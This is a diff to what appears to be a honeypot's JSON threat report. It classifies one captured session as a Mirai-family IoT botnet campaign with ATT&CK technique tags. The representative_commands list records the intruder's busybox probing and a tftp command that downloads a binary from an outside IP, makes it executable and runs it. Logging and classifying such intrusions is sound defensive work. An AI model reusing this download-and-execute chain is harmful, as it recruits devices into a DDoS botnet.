@@ -1,37 +1,94 @@
 {
-  "generated_at": "2026-03-25T10:46:32.445500+00:00",
+  "generated_at": "2026-03-25T13:04:19.769722+00:00",
   "total_sessions_with_commands": 1,
   "total_clusters": 1,
-  "campaign_clusters": 0,
+  "campaign_clusters": 1,
   "singleton_clusters": 1,
-  "highest_severity": "NONE",
-  "active_campaigns": [],
+  "highest_severity": "HIGH",
+  "active_campaigns": [
+    {
+      "cluster_id": "CLU-001",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1105",
+        "T1082",
+        "T1592",
+        "T1140",
+        "T1059.004"
+      ]
+    }
+  ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 2,
+          "pattern_total": 3
+        }
+      ],
       "session_count": 1,
       "unique_ips": [
-        "157.66.144.16"
+        "37.157.219.158"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d960c2eba2b5400c",
-      "ttps": [],
+      "sequence_hash": "5e35ca30bb519b45",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
       "representative_commands": [
-        "echo TEST"
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "cat /proc/mounts; /bin/busybox GVLAD",
+        "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GVLAD",
+        "tftp; wget; /bin/busybox GVLAD",
+        "dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s",
+        "/bin/busybox GVLAD",
+        "rm .s; tftp -l.i -r.i -g 37.157.219.158:16470; chmod 777 .i; ./.i; exit"
       ],
       "members": [
         {
-          "session_id": "IR-6ffb2029fe27",
-          "src_ip": "157.66.144.16",
+          "session_id": "IR-b7811a5f3959",
+          "src_ip": "37.157.219.158",
           "country": "",
           "isp": "",
-          "command_count": 1,
-          "timestamp": "2026-03-25T10:04:49.662342Z"
+          "command_count": 10,
+          "timestamp": "2026-03-25T11:09:25.855436Z"
         }
       ]
     }
